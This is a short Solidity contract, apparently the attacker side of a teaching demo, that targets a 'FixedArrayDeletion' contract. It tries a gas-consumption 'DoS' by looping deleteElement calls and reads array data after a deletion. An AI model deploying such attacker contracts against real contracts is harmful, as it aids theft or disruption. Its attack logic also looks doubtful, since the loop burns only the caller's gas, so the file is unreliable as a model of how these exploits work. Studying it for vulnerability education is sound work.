// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Array-deletion.sol";

contract MaliciousArrayDeletion {
    FixedArrayDeletion public fixedArrayContract;

    constructor(address _fixedArrayContract) {
        fixedArrayContract = FixedArrayDeletion(_fixedArrayContract);
    }

    function exploitGasConsumption(uint index) public {
        // Initiating high gas consumption by repeatedly attempting element deletion
        for (uint i = 0; i < 100; i++) {
            try fixedArrayContract.deleteElement(index) {
                // Expected to revert due to invalid index or completion
            } catch {
                // Continue trying to create DoS scenario
            }
        }
    }

    function exploitDataInconsistency(uint index) public {
        // Delete an element to cause potential data inconsistency
        fixedArrayContract.deleteElement(index);
        uint length = fixedArrayContract.getLength();
        if (index < length) {
            uint hackedData = fixedArrayContract.myArray(index);
            // Use hackedData for further manipulation or logic
        }
    }
}